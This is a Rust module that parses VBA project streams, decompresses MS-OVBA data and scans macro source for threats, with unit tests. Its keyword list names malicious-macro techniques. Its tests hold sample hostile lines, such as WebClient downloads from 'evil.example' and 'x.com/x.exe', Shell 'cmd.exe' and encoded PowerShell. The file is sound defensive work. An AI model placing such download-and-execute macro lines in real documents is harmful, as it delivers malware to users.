//! VBA (Visual Basic for Applications) project parser and scanner.
//!
//! Parses the VBA dir-stream record format (MS-OVBA §2.3.4) and implements
//! the MS-OVBA RLE decompression algorithm (§2.4).

// ── Errors ────────────────────────────────────────────────────────────────────

/// Errors produced by VBA parsing or decompression.
#[derive(Debug, thiserror::Error)]
pub enum VbaError {
    /// The compressed or dir stream magic byte is wrong.
    #[error("invalid VBA magic")]
    InvalidMagic,
    /// Input data is too short.
    #[error("VBA data truncated")]
    Truncated,
    /// Generic structured parse error.
    #[error("VBA parse error: {0}")]
    ParseError(String),
    /// RLE decompression failed.
    #[error("VBA decompression failed")]
    DecompressionFailed,
}

// ── Module types ──────────────────────────────────────────────────────────────

/// The kind of a VBA module.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum VbaModuleType {
    /// Standard .bas module.
    Standard,
    /// Class module (.cls).
    Class,
    /// Designer form module.
    Designer,
    /// Document module (`ThisDocument`, Sheet1, etc.).
    Document,
}

// ── VbaModule ─────────────────────────────────────────────────────────────────

/// A single VBA module within a project.
#[derive(Debug, Clone)]
pub struct VbaModule {
    /// Module name (MODULENAME record).
    pub name: String,
    /// Name of the OLE stream containing the p-code + compressed source.
    pub stream_name: String,
    /// Byte offset of the compressed source within the stream.
    pub offset: u32,
    /// Module type.
    pub module_type: VbaModuleType,
    /// Decompressed VBA source code, if available.
    pub source_code: Option<String>,
}

// ── VbaReference ──────────────────────────────────────────────────────────────

/// An external library reference declared in the project.
#[derive(Debug, Clone)]
pub struct VbaReference {
    /// Reference name.
    pub name: String,
    /// LIBID string (type-library GUID path).
    pub lib_id: String,
    /// Major version of the referenced library.
    pub major: u32,
    /// Minor version of the referenced library.
    pub minor: u16,
}

// ── VbaProject ────────────────────────────────────────────────────────────────

/// Parsed VBA project.
#[derive(Debug, Clone)]
pub struct VbaProject {
    /// All modules in the project.
    pub modules: Vec<VbaModule>,
    /// External library references.
    pub references: Vec<VbaReference>,
    /// Code page used for text encoding.
    pub code_page: u16,
    /// Project name (PROJECTNAME record).
    pub project_name: String,
    /// System kind (0=Win16, 1=Win32, 2=Mac, 3=Win64).
    pub sys_kind: u32,
}

// ── Record IDs (MS-OVBA §2.3.4.2) ────────────────────────────────────────────

const RECORD_SYSKIND: u16 = 0x0001;
const RECORD_CODEPAGE: u16 = 0x0003;
const RECORD_PROJECTNAME: u16 = 0x0004;
const RECORD_MODULENAME: u16 = 0x0019;
const RECORD_MODULENAMEUNICODE: u16 = 0x0047;
const RECORD_MODULESTREAMNAME: u16 = 0x001A;
const RECORD_MODULEOFFSET: u16 = 0x0031;
const RECORD_MODULETYPE_PROC: u16 = 0x0021;
const RECORD_MODULETYPE_CLASS: u16 = 0x0022;
const RECORD_MODULETERM: u16 = 0x002B;
const RECORD_PROJECTREFERENCE_NAME: u16 = 0x0016;
const RECORD_REFERENCE_LIBID: u16 = 0x0033;
const RECORD_REFERENCE_REGISTERED: u16 = 0x000D;
const RECORD_REFERENCE_CONTROL: u16 = 0x002F;

// ── Parse helpers ─────────────────────────────────────────────────────────────

/// Read a little-endian `u16` from `data[pos..]`.
#[must_use] 
pub fn read_u16_le(data: &[u8], pos: usize) -> u16 {
    if pos + 2 > data.len() {
        return 0;
    }
    u16::from_le_bytes([data[pos], data[pos + 1]])
}

/// Read a little-endian `u32` from `data[pos..]`.
#[must_use] 
pub fn read_u32_le(data: &[u8], pos: usize) -> u32 {
    if pos + 4 > data.len() {
        return 0;
    }
    u32::from_le_bytes([data[pos], data[pos + 1], data[pos + 2], data[pos + 3]])
}

impl VbaProject {
    /// Parse the decompressed VBA dir stream into a `VbaProject`.
    ///
    /// # Errors
    /// Returns `VbaError::Truncated` if the stream is too short to parse.
    pub fn parse_dir_stream(data: &[u8]) -> Result<Self, VbaError> {
        let mut pos = 0;
        let mut sys_kind = 1u32;
        let mut code_page = 1252u16;
        let mut project_name = String::new();
        let mut modules: Vec<VbaModule> = Vec::new();
        let mut references: Vec<VbaReference> = Vec::new();

        // Current module being assembled
        let mut cur_name = String::new();
        let mut cur_stream = String::new();
        let mut cur_offset = 0u32;
        let mut cur_type = VbaModuleType::Standard;

        while pos + 6 <= data.len() {
            let record_id = read_u16_le(data, pos);
            let record_size = read_u32_le(data, pos + 2) as usize;
            pos += 6;

            if pos + record_size > data.len() {
                break;
            }

            let record_data = &data[pos..pos + record_size];
            pos += record_size;

            match record_id {
                RECORD_SYSKIND => {
                    if record_size >= 4 {
                        sys_kind = read_u32_le(record_data, 0);
                    }
                }
                RECORD_CODEPAGE => {
                    if record_size >= 2 {
                        code_page = read_u16_le(record_data, 0);
                    }
                }
                RECORD_PROJECTNAME => {
                    project_name = String::from_utf8_lossy(record_data).into_owned();
                }
                RECORD_MODULENAME => {
                    // If we have a pending module, push it
                    if !cur_name.is_empty() {
                        modules.push(VbaModule {
                            name: cur_name.clone(),
                            stream_name: cur_stream.clone(),
                            offset: cur_offset,
                            module_type: cur_type,
                            source_code: None,
                        });
                    }
                    cur_name = String::from_utf8_lossy(record_data).into_owned();
                    cur_stream.clone_from(&cur_name); // default
                    cur_offset = 0;
                    cur_type = VbaModuleType::Standard;
                }
                RECORD_MODULENAMEUNICODE => {
                    // Unicode name — only used when code page doesn't support the name
                    // We keep the ANSI name already set; skip.
                }
                RECORD_MODULESTREAMNAME => {
                    cur_stream = String::from_utf8_lossy(record_data).into_owned();
                }
                RECORD_MODULEOFFSET => {
                    if record_size >= 4 {
                        cur_offset = read_u32_le(record_data, 0);
                    }
                }
                RECORD_MODULETYPE_PROC => {
                    cur_type = VbaModuleType::Standard;
                }
                RECORD_MODULETYPE_CLASS => {
                    cur_type = VbaModuleType::Class;
                }
                RECORD_MODULETERM => {
                    // End of a module record sequence
                    if !cur_name.is_empty() {
                        modules.push(VbaModule {
                            name: cur_name.clone(),
                            stream_name: cur_stream.clone(),
                            offset: cur_offset,
                            module_type: cur_type,
                            source_code: None,
                        });
                        cur_name = String::new();
                        cur_stream = String::new();
                        cur_offset = 0;
                        cur_type = VbaModuleType::Standard;
                    }
                }
                RECORD_PROJECTREFERENCE_NAME => {
                    let ref_name = String::from_utf8_lossy(record_data).into_owned();
                    references.push(VbaReference {
                        name: ref_name,
                        lib_id: String::new(),
                        major: 0,
                        minor: 0,
                    });
                }
                RECORD_REFERENCE_LIBID => {
                    if let Some(r) = references.last_mut() {
                        r.lib_id = String::from_utf8_lossy(record_data).into_owned();
                    }
                }
                RECORD_REFERENCE_REGISTERED | RECORD_REFERENCE_CONTROL => {
                    // Skip — version info would be here for registered references
                }
                _ => {
                    // Unknown record — skip past data
                }
            }
        }

        // Flush last pending module
        if !cur_name.is_empty() {
            modules.push(VbaModule {
                name: cur_name,
                stream_name: cur_stream,
                offset: cur_offset,
                module_type: cur_type,
                source_code: None,
            });
        }

        Ok(Self {
            modules,
            references,
            code_page,
            project_name,
            sys_kind,
        })
    }
}

// ── MS-OVBA decompression (§2.4) ─────────────────────────────────────────────

/// Decompress a VBA compressed container (MS-OVBA RLE).
///
/// The `compressed` slice must start at the `SignatureByte` (`0x01`).
///
/// # Errors
/// Returns `VbaError::InvalidMagic` if the signature byte is wrong.
/// Returns `VbaError::DecompressionFailed` if the stream is malformed.
pub fn decompress_vba(compressed: &[u8]) -> Result<Vec<u8>, VbaError> {
    if compressed.is_empty() {
        return Err(VbaError::Truncated);
    }
    if compressed[0] != 0x01 {
        return Err(VbaError::InvalidMagic);
    }

    let mut decompressed = Vec::with_capacity(4096);
    let mut src = 1; // skip SignatureByte

    while src < compressed.len() {
        // Read CompressedChunkHeader (2 bytes LE)
        if src + 2 > compressed.len() {
            break;
        }
        let chunk_hdr = u16::from_le_bytes([compressed[src], compressed[src + 1]]);
        src += 2;

        let compressed_size = ((chunk_hdr & 0x0FFF) + 3) as usize; // CompressedChunkSize
        let signature = (chunk_hdr >> 12) & 0xF;
        let is_compressed = (chunk_hdr >> 15) != 0;

        if signature != 0b0011 {
            return Err(VbaError::DecompressionFailed);
        }

        let chunk_end = src + compressed_size - 2; // -2 because header already consumed
        let chunk_end = chunk_end.min(compressed.len());
        let decompressed_start = decompressed.len();

        if is_compressed {
            // Compressed chunk
            let mut src2 = src;
            while src2 < chunk_end {
                if src2 >= compressed.len() {
                    break;
                }
                let flag_byte = compressed[src2];
                src2 += 1;

                for bit in 0..8u8 {
                    if src2 >= chunk_end || src2 >= compressed.len() {
                        break;
                    }
                    if (flag_byte >> bit) & 1 == 0 {
                        // LiteralToken
                        decompressed.push(compressed[src2]);
                        src2 += 1;
                    } else {
                        // CopyToken
                        if src2 + 2 > compressed.len() {
                            break;
                        }
                        let copy_token =
                            u16::from_le_bytes([compressed[src2], compressed[src2 + 1]]);
                        src2 += 2;

                        let decompressed_so_far = decompressed.len() - decompressed_start;
                        // Determine how many bits for length vs offset based on
                        // DecompressedChunkSize so far (MS-OVBA §2.4.1.3.6)
                        let len_mask_bit = copy_token_length_mask_bits(decompressed_so_far);
                        let len_mask = (1u16 << len_mask_bit) - 1;
                        let len = ((copy_token & len_mask) as usize) + 3;
                        let offset = ((copy_token >> len_mask_bit) as usize) + 1;

                        let copy_pos = if decompressed.len() >= offset {
                            decompressed.len() - offset
                        } else {
                            0
                        };
                        for i in 0..len {
                            let b = if copy_pos + i < decompressed.len() {
                                decompressed[copy_pos + i]
                            } else {
                                0
                            };
                            decompressed.push(b);
                        }
                    }
                }
            }
            src = chunk_end;
        } else {
            // Raw chunk: exactly 4096 bytes
            for i in src..chunk_end.min(src + 4096) {
                if i < compressed.len() {
                    decompressed.push(compressed[i]);
                }
            }
            src += 4096;
            src = src.min(compressed.len());
            // Pad to 4096
            let written = decompressed.len().saturating_sub(decompressed_start);
            decompressed.resize(decompressed.len() + 4096usize.saturating_sub(written), 0);
        }
    }

    Ok(decompressed)
}

/// Calculate the number of length bits for a `CopyToken` given the current
/// decompressed size within the chunk (MS-OVBA §2.4.1.3.6).
fn copy_token_length_mask_bits(decompressed_size: usize) -> u8 {
    // The number of offset bits grows as the window fills up.
    // offset bits = ceil(log2(max(decompressed_size, 16))) clamped to 4–12
    let window = decompressed_size.max(16);
    let offset_bits = if window <= 16 {
        4u8
    } else if window <= 32 {
        5
    } else if window <= 64 {
        6
    } else if window <= 128 {
        7
    } else if window <= 256 {
        8
    } else if window <= 512 {
        9
    } else if window <= 1024 {
        10
    } else if window <= 2048 {
        11
    } else {
        12
    };
    16 - offset_bits // length bits
}

// ── VBA threat scanning ───────────────────────────────────────────────────────

/// A suspicious pattern found in VBA source code.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum VbaThreat {
    /// `Auto_Open`, `Document_Open`, etc.
    AutoOpen,
    /// `Auto_Close`, `Document_BeforeClose`.
    AutoClose,
    /// `AutoExec`.
    AutoExec,
    /// `Shell`, `Environ("COMSPEC")`.
    ShellCall,
    /// `CreateObject`.
    CreateObject,
    /// `GetObject`.
    GetObject,
    /// `WScript.Shell`.
    WscriptShell,
    /// `DownloadString`, `WebClient`.
    DownloadString,
    /// `DownloadFile`.
    DownloadFile,
    /// `PowerShell` invocation in code.
    PowerShellDrop,
    /// Base64-encoded payload string.
    Base64Encoded,
    /// Hex-encoded payload string.
    HexEncoded,
}

impl VbaThreat {
    /// Human-readable name.
    #[must_use]
    pub const fn name(&self) -> &'static str {
        match self {
            Self::AutoOpen => "AutoOpen",
            Self::AutoClose => "AutoClose",
            Self::AutoExec => "AutoExec",
            Self::ShellCall => "ShellCall",
            Self::CreateObject => "CreateObject",
            Self::GetObject => "GetObject",
            Self::WscriptShell => "WscriptShell",
            Self::DownloadString => "DownloadString",
            Self::DownloadFile => "DownloadFile",
            Self::PowerShellDrop => "PowerShellDrop",
            Self::Base64Encoded => "Base64Encoded",
            Self::HexEncoded => "HexEncoded",
        }
    }
}

/// Scanner for VBA source-level threats.
#[derive(Debug, Default)]
pub struct VbaScanner;

impl VbaScanner {
    /// Create a new `VbaScanner`.
    #[must_use]
    pub const fn new() -> Self {
        Self
    }

    /// Scan VBA source code for suspicious patterns.
    #[must_use]
    pub fn scan_source(code: &str) -> Vec<VbaThreat> {
        let lower = code.to_lowercase();
        let mut threats = Vec::new();

        // AutoOpen / Document_Open
        if lower.contains("auto_open")
            || lower.contains("document_open")
            || lower.contains("workbook_open")
            || lower.contains("auto open")
        {
            threats.push(VbaThreat::AutoOpen);
        }
        // AutoClose
        if lower.contains("auto_close")
            || lower.contains("document_beforeclose")
            || lower.contains("workbook_beforeclose")
        {
            threats.push(VbaThreat::AutoClose);
        }
        // AutoExec
        if lower.contains("autoexec") {
            threats.push(VbaThreat::AutoExec);
        }
        // Shell
        if lower.contains("shell(") || lower.contains("shell ") || lower.contains("wshell") {
            threats.push(VbaThreat::ShellCall);
        }
        // CreateObject
        if lower.contains("createobject") {
            threats.push(VbaThreat::CreateObject);
        }
        // GetObject
        if lower.contains("getobject(") {
            threats.push(VbaThreat::GetObject);
        }
        // WScript.Shell
        if lower.contains("wscript.shell") || lower.contains("\"wscript.shell\"") {
            threats.push(VbaThreat::WscriptShell);
        }
        // DownloadString
        if lower.contains("downloadstring") || lower.contains("webclient") {
            threats.push(VbaThreat::DownloadString);
        }
        // DownloadFile
        if lower.contains("downloadfile") {
            threats.push(VbaThreat::DownloadFile);
        }
        // PowerShell
        if lower.contains("powershell")
            || lower.contains("-encodedcommand")
            || lower.contains("-enc ")
        {
            threats.push(VbaThreat::PowerShellDrop);
        }
        // Base64
        if lower.contains("frombase64string") || lower.contains("tobase64string") {
            threats.push(VbaThreat::Base64Encoded);
        }
        // Hex encoded strings (long strings of &H)
        let hex_count = code.matches("&H").count();
        if hex_count > 10 {
            threats.push(VbaThreat::HexEncoded);
        }

        threats
    }

    /// Scan all modules in `project` for VBA threats.
    #[must_use]
    pub fn scan_project(project: &VbaProject) -> Vec<VbaThreat> {
        let mut all_threats = Vec::new();
        for module in &project.modules {
            if let Some(code) = &module.source_code {
                let mut t = Self::scan_source(code);
                all_threats.append(&mut t);
            }
        }
        // Deduplicate
        all_threats.sort_by_key(VbaThreat::name);
        all_threats.dedup_by_key(|t| t.name());
        all_threats
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── read helpers ──────────────────────────────────────────────────────────

    #[test]
    fn test_read_u16_le() {
        assert_eq!(read_u16_le(&[0x01, 0x02], 0), 0x0201);
    }

    #[test]
    fn test_read_u32_le() {
        assert_eq!(read_u32_le(&[0x01, 0x02, 0x03, 0x04], 0), 0x04030201);
    }

    #[test]
    fn test_read_u16_le_out_of_bounds() {
        assert_eq!(read_u16_le(&[0x01], 0), 0);
    }

    #[test]
    fn test_read_u32_le_out_of_bounds() {
        assert_eq!(read_u32_le(&[0x01, 0x02], 0), 0);
    }

    // ── decompress_vba ────────────────────────────────────────────────────────

    #[test]
    fn test_decompress_vba_invalid_magic() {
        let err = decompress_vba(&[0x02, 0x00]).unwrap_err();
        assert!(matches!(err, VbaError::InvalidMagic));
    }

    #[test]
    fn test_decompress_vba_empty() {
        let err = decompress_vba(&[]).unwrap_err();
        assert!(matches!(err, VbaError::Truncated));
    }

    #[test]
    fn test_decompress_vba_only_signature() {
        // Just signature byte, no chunks — should succeed with empty output
        let result = decompress_vba(&[0x01]).unwrap();
        assert!(result.is_empty());
    }

    #[test]
    fn test_decompress_vba_raw_chunk() {
        // Build a raw (uncompressed) chunk: header with is_compressed=0
        // size field = 4096-3 = 4093 = 0x0FFD, signature=0b0011, is_compressed=0
        // header = 0b0_0011_xxxx_xxxx_xxxx where xxxx = 0xFFD
        let chunk_hdr: u16 = (0b0_011 << 12) | 0xFFD; // signature=3, compressed=0, size=4093
        // raw chunk: 4096 bytes of 'A'
        let mut data = vec![0x01u8]; // SignatureByte
        data.push(chunk_hdr as u8);
        data.push((chunk_hdr >> 8) as u8);
        data.extend(vec![b'A'; 4096]);
        let result = decompress_vba(&data).unwrap();
        assert!(!result.is_empty());
        assert!(result.iter().all(|&b| b == b'A' || b == 0));
    }

    // ── VbaProject::parse_dir_stream ─────────────────────────────────────────

    fn make_record(id: u16, payload: &[u8]) -> Vec<u8> {
        let mut r = Vec::new();
        r.extend_from_slice(&id.to_le_bytes());
        r.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        r.extend_from_slice(payload);
        r
    }

    #[test]
    fn test_parse_dir_stream_empty() {
        let proj = VbaProject::parse_dir_stream(&[]).unwrap();
        assert!(proj.modules.is_empty());
    }

    #[test]
    fn test_parse_dir_stream_syskind() {
        let mut data = make_record(RECORD_SYSKIND, &3u32.to_le_bytes());
        data.extend(make_record(RECORD_CODEPAGE, &1252u16.to_le_bytes()));
        let proj = VbaProject::parse_dir_stream(&data).unwrap();
        assert_eq!(proj.sys_kind, 3);
        assert_eq!(proj.code_page, 1252);
    }

    #[test]
    fn test_parse_dir_stream_project_name() {
        let data = make_record(RECORD_PROJECTNAME, b"MyProject");
        let proj = VbaProject::parse_dir_stream(&data).unwrap();
        assert_eq!(proj.project_name, "MyProject");
    }

    #[test]
    fn test_parse_dir_stream_single_module() {
        let mut data = make_record(RECORD_MODULENAME, b"Module1");
        data.extend(make_record(RECORD_MODULESTREAMNAME, b"Module1"));
        data.extend(make_record(RECORD_MODULEOFFSET, &0u32.to_le_bytes()));
        data.extend(make_record(RECORD_MODULETYPE_PROC, &[]));
        data.extend(make_record(RECORD_MODULETERM, &[]));
        let proj = VbaProject::parse_dir_stream(&data).unwrap();
        assert_eq!(proj.modules.len(), 1);
        assert_eq!(proj.modules[0].name, "Module1");
        assert_eq!(proj.modules[0].module_type, VbaModuleType::Standard);
    }

    #[test]
    fn test_parse_dir_stream_class_module() {
        let mut data = make_record(RECORD_MODULENAME, b"Class1");
        data.extend(make_record(RECORD_MODULETYPE_CLASS, &[]));
        data.extend(make_record(RECORD_MODULETERM, &[]));
        let proj = VbaProject::parse_dir_stream(&data).unwrap();
        assert_eq!(proj.modules.len(), 1);
        assert_eq!(proj.modules[0].module_type, VbaModuleType::Class);
    }

    #[test]
    fn test_parse_dir_stream_multiple_modules() {
        let mut data = make_record(RECORD_MODULENAME, b"Mod1");
        data.extend(make_record(RECORD_MODULETERM, &[]));
        data.extend(make_record(RECORD_MODULENAME, b"Mod2"));
        data.extend(make_record(RECORD_MODULETERM, &[]));
        let proj = VbaProject::parse_dir_stream(&data).unwrap();
        assert_eq!(proj.modules.len(), 2);
    }

    #[test]
    fn test_parse_dir_stream_reference() {
        let mut data = make_record(RECORD_PROJECTREFERENCE_NAME, b"stdole");
        data.extend(make_record(RECORD_REFERENCE_LIBID, b"{00020430-...}"));
        let proj = VbaProject::parse_dir_stream(&data).unwrap();
        assert_eq!(proj.references.len(), 1);
        assert_eq!(proj.references[0].name, "stdole");
    }

    // ── VbaScanner ────────────────────────────────────────────────────────────

    #[test]
    fn test_scan_source_auto_open() {
        let code = "Sub Auto_Open()\n  Shell \"cmd.exe\"\nEnd Sub";
        let threats = VbaScanner::scan_source(code);
        assert!(threats.contains(&VbaThreat::AutoOpen));
        assert!(threats.contains(&VbaThreat::ShellCall));
    }

    #[test]
    fn test_scan_source_create_object() {
        let code = "Set obj = CreateObject(\"WScript.Shell\")";
        let threats = VbaScanner::scan_source(code);
        assert!(threats.contains(&VbaThreat::CreateObject));
        assert!(threats.contains(&VbaThreat::WscriptShell));
    }

    #[test]
    fn test_scan_source_powershell() {
        let code = "Shell \"powershell -EncodedCommand aaaa\"";
        let threats = VbaScanner::scan_source(code);
        assert!(threats.contains(&VbaThreat::PowerShellDrop));
    }

    #[test]
    fn test_scan_source_base64() {
        let code = "Dim s = Convert.FromBase64String(\"aGVsbG8=\")";
        let threats = VbaScanner::scan_source(code);
        assert!(threats.contains(&VbaThreat::Base64Encoded));
    }

    #[test]
    fn test_scan_source_hex_encoded() {
        let code = "&H41 &H42 &H43 &H44 &H45 &H46 &H47 &H48 &H49 &H4A &H4B";
        let threats = VbaScanner::scan_source(code);
        assert!(threats.contains(&VbaThreat::HexEncoded));
    }

    #[test]
    fn test_scan_source_clean() {
        let code = "Sub Hello()\n  MsgBox \"Hello World\"\nEnd Sub";
        let threats = VbaScanner::scan_source(code);
        assert!(threats.is_empty());
    }

    #[test]
    fn test_scan_source_download_string() {
        let code = "Dim wc As New WebClient\nwc.DownloadString(\"http://evil.example/\")";
        let threats = VbaScanner::scan_source(code);
        assert!(threats.contains(&VbaThreat::DownloadString));
    }

    #[test]
    fn test_scan_project_deduplicates() {
        let proj = VbaProject {
            modules: vec![
                VbaModule {
                    name: "M1".into(),
                    stream_name: "M1".into(),
                    offset: 0,
                    module_type: VbaModuleType::Standard,
                    source_code: Some("Sub Auto_Open()\nEnd Sub".into()),
                },
                VbaModule {
                    name: "M2".into(),
                    stream_name: "M2".into(),
                    offset: 0,
                    module_type: VbaModuleType::Standard,
                    source_code: Some("Sub Auto_Open()\nEnd Sub".into()),
                },
            ],
            references: vec![],
            code_page: 1252,
            project_name: "Test".into(),
            sys_kind: 1,
        };
        let threats = VbaScanner::scan_project(&proj);
        // Deduplicated: AutoOpen should appear only once
        let count = threats
            .iter()
            .filter(|t| **t == VbaThreat::AutoOpen)
            .count();
        assert_eq!(count, 1);
    }

    #[test]
    fn test_vba_threat_names() {
        assert_eq!(VbaThreat::AutoOpen.name(), "AutoOpen");
        assert_eq!(VbaThreat::PowerShellDrop.name(), "PowerShellDrop");
        assert_eq!(VbaThreat::Base64Encoded.name(), "Base64Encoded");
    }

    #[test]
    fn test_module_type_variants() {
        assert_ne!(VbaModuleType::Standard, VbaModuleType::Class);
        assert_ne!(VbaModuleType::Designer, VbaModuleType::Document);
    }

    // ── copy_token_length_mask_bits ───────────────────────────────────────────

    #[test]
    fn test_copy_token_bits_small_window() {
        // window = 16: offset_bits = 4, length_bits = 12
        assert_eq!(copy_token_length_mask_bits(0), 12);
    }

    #[test]
    fn test_copy_token_bits_large_window() {
        // window = 4096: offset_bits = 12, length_bits = 4
        assert_eq!(copy_token_length_mask_bits(4096), 4);
    }

    // Additional scanner tests
    #[test]
    fn test_scan_source_auto_close() {
        let code = "Sub Document_BeforeClose(Cancel As Boolean)\nEnd Sub";
        let threats = VbaScanner::scan_source(code);
        assert!(threats.contains(&VbaThreat::AutoClose));
    }

    #[test]
    fn test_scan_source_get_object() {
        let code = "Set x = GetObject(\"winmgmts:\")";
        let threats = VbaScanner::scan_source(code);
        assert!(threats.contains(&VbaThreat::GetObject));
    }

    #[test]
    fn test_scan_source_download_file() {
        let code = "wc.DownloadFile(\"http://x.com/x.exe\", \"C:\\x.exe\")";
        let threats = VbaScanner::scan_source(code);
        assert!(threats.contains(&VbaThreat::DownloadFile));
    }

    #[test]
    fn test_vba_error_display() {
        assert!(VbaError::InvalidMagic.to_string().contains("magic"));
        assert!(VbaError::Truncated.to_string().contains("truncated"));
        assert!(
            VbaError::DecompressionFailed
                .to_string()
                .contains("decompression")
        );
    }
}
